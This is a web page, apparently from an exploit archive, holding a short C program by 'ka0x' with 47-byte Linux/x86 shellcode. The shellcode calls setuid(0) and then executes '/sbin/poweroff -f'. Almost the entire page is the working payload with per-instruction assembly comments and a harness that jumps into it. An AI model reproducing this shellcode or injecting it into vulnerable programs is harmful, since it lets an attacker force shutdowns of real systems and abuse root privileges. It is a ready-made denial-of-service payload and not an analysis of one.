<html><head><title>Linux/x86 - setuid(0) &amp; execve(/sbin/poweroff -f) - 47 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
#include &lt;stdio.h&gt;
 
/*
    linux/x86 ; setuid(0) &amp; execve(&quot;/sbin/poweroff -f&quot;) 47 bytes
    written by ka0x - &lt;ka0x01[alt+64]gmail.com&gt;
    lun sep 21 16:40:16 CEST 2009
 
    greets: an0de, Piker, xarnuz, NullWave07, Pepelux, JosS, sch3m4, Trancek, Hendrix and others!
*/
 
int main()
{
    char shellcode[] =
            &quot;\x31\xdb&quot;      // xor ebx,ebx
            &quot;\x6a\x17&quot;      // push byte 0x17
            &quot;\x58&quot;          // pop eax
            &quot;\xcd\x80&quot;      // int 80h
            &quot;\x8d\x43\x0b&quot;      // lea eax,[ebx+0xb]
            &quot;\x99&quot;          // cdq
            &quot;\x52&quot;          // push edx
            &quot;\x66\x68\x66\x66&quot;  // push word 0x6666
            &quot;\x68\x77\x65\x72\x6f&quot;  // push dword 0x6f726577
            &quot;\x68\x6e\x2f\x70\x6f&quot;  // push dword 0x6f702f6e
            &quot;\x68\x2f\x73\x62\x69&quot;  // push dword 0x6962732f
            &quot;\x89\xe3&quot;      // mov ebx,esp
            &quot;\x52&quot;          // push edx
            &quot;\x66\x68\x2d\x66&quot;  // push word 0x662d
            &quot;\x89\xe1&quot;      // mov ecx,esp
            &quot;\x52&quot;          // push edx
            &quot;\x51&quot;          // push ecx
            &quot;\x53&quot;          // push ebx
            &quot;\x89\xe1&quot;      // mov ecx,esp
            &quot;\xcd\x80&quot; ;        // int 80h
 
    printf(&quot;[*] ShellCode size (bytes): %d\n\n&quot;, sizeof(shellcode)-1 );
    (*(void(*)()) shellcode)();
     
    return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
